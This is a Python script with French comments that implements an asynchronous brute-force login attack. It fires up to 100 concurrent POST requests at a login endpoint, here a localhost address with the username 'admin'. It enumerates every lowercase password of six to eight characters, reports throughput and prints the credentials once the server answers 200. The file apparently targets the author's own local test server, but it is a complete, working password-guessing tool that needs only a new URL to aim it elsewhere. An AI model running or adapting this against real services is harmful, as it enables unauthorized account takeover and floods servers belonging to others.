'''VERSION ASYNCHRONE PARALLÈLE : ENVOI DE REQUÈTES EN MASSE SIMULTANÉES
Pour les commentaires spécifiques a des variables "de base" voir /spam_V3/sync.py
'''
 
import httpx     
import asyncio
import sys # pour faire joli dans le terminal
import string
import itertools # Générer combinaisons
import time

CHARGEMENT = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

async def send_request(client: httpx.AsyncClient, username: str, password: str) -> int: # renvoie un entier
    url = "http://127.0.0.1:9000/login"
    donnees = {                                                                                  
        "username": username,                                                    
        "password": password                                                           
    }
    
    try:
        # Un timeout court (2.0s) évite au script de rester bloqué sur une requête perdue
        reponse = await client.post(url, data=donnees, timeout=2.0)
        return reponse.status_code
    except Exception:
        return 0 # Gère les micro-coupures réseau sans faire planter le script

# Fonction pour générer les mots de passe un par un
def search_password():
    # Choisir ses infos
    caracteres = string.ascii_lowercase # + string.digits + string.ascii_uppercase
    
    # Boucle for (les bases si tu connait pas ça chut):
    # Indices ---------: 0 1 2 3 
    # Numéros asscoiés : 1 2 3 4 
    # ATTENTION : la fin subit le comportement en n-1 (avec tableau des indices) ALORS que le premier est simplement le num demandé
    
    # Changer les indices pour taille min / max du mdp 
    # ex : for i in range (7,10) ->  de 7 caracteres a 9 
    for longueur in range(6, 9):
        # itertools.product génère toutes les combinaisons possibles pour une longueur donnée
        for combinaison in itertools.product(caracteres, repeat=longueur):
            # combinaison est un tuple ('a', 'b'), on le fusionne en texte "ab"
            yield "".join(combinaison)
            # yeeld : renvoie une valeur sans couper la focntion

async def worker_test_password(client, semaphore, username, password, evenement_succes, stats, temps_debut):
    """ Tâche individuelle qui gère l'envoi d'UN mot de passe en parallèle """
    # Le sémaphore limite le nombre de requêtes simultanées en cours
    async with semaphore:
        # Si un autre worker a déjà trouvé le bon mdp, on annule immédiatement
        if evenement_succes.is_set():
            return

        # Envoi de la requête réseau
        statut = await send_request(client, username, password)
        stats["tentatives"] += 1

        # MÀJ de l'animation graphique basée sur les totaux globaux
        temps_actuel = time.perf_counter() - temps_debut
        vitesse = stats["tentatives"] / temps_actuel if temps_actuel > 0 else 0
        symbole = CHARGEMENT[stats["tentatives"] % len(CHARGEMENT)]
        
        sys.stdout.write(f"\r{symbole} [En cours...] | Tentatives: {stats['tentatives']} | Temps: {temps_actuel:.1f}s | Vitesse: {int(vitesse)} mots/s")
        sys.stdout.flush()

        # Analyse du résultat
        if statut == 200:
            evenement_succes.set() # Déclenche l'arrêt immédiat de TOUTES les autres tâches en cours
            sys.stdout.write("\r" + " " * 95 + "\r")                                                                     
            print(f"✅ tentatives : {stats['tentatives']}")
            print(f"⏱️ Temps total : {temps_actuel:.2f} secondes")
            print(f"📊 Vitesse finale : {int(vitesse)} mots/seconde")
            print(f"👤 Login : {username}")
            print(f"🔑 MDP   : {password}")
            
        elif statut in (404, 403):
            evenement_succes.set() # Arrêt d'urgence globale
            sys.stdout.write("\r" + " " * 95 + "\r")
            if statut == 404:
                print("❌ Erreur 404 : L'adresse cible est introuvable.")
            else:
                print("🔒 Erreur 403 : Accès interdit (IP bloquée ou pare-feu)")
                                                                         
async def main():
    print('🚀 Démarrage du moteur de recherche ULTRA-PARALLÈLE (async.py)...')
    
    # Dictionnaires partagés pour les statistiques des workers
    stats = {"tentatives": 0}
    temps_debut = time.perf_counter()
    evenement_succes = asyncio.Event()
    
    # OPTIMISATION MULTI-REQUÊTES : Autorise un maximum de 30 requêtes SIMULTANÉES
    # Tu peux monter à 50 ou 100 si ton serveur local encaisse sans crash (erreur 0)
    semaphore = asyncio.Semaphore(100)
    
    # LE USERNAME EST CONNU
    USERNAME_CONNU = "admin"
    
    # Initialisation de notre générateur de mots de passe
    moteur_de_recherche = search_password()
    
    # OPTIMISATION MAJEURE : On ouvre LE client unique AVANT la boucle
    async with httpx.AsyncClient() as client:
        taches_en_cours = []
        
        while not evenement_succes.is_set():
            try:
                # Récupération du prochain mot de passe à tester
                password_actuel = next(moteur_de_recherche)
            except StopIteration:
                print("\n❌ Toutes les combinaisons possibles ont été testées.")
                break

            # On crée une tâche asynchrone en arrière-plan sans bloquer la boucle while.
            # Elle va rejoindre la file d'attente et s'exécuter dès qu'une place se libère dans le sémaphore.
            tache = asyncio.create_task(
                worker_test_password(client, semaphore, USERNAME_CONNU, password_actuel, evenement_succes, stats, temps_debut)
            )
            taches_en_cours.append(tache)
            
            # Sécurité mémoire : Évite d'accumuler des millions de tâches en RAM d'un coup
            if len(taches_en_cours) >= 150:
                # On fait une pause d'une milliseconde pour laisser le processeur vider et traiter les requêtes HTTP en cours
                await asyncio.sleep(0.001)
                # On nettoie notre liste en ne gardant que les tâches qui n'ont pas encore fini
                taches_en_cours = [t for t in taches_en_cours if not t.done()]

        # Attente de la fermeture propre de toutes les requêtes restantes lors de la coupure (break / succès)
        await asyncio.gather(*taches_en_cours, return_exceptions=True)

asyncio.run(main())
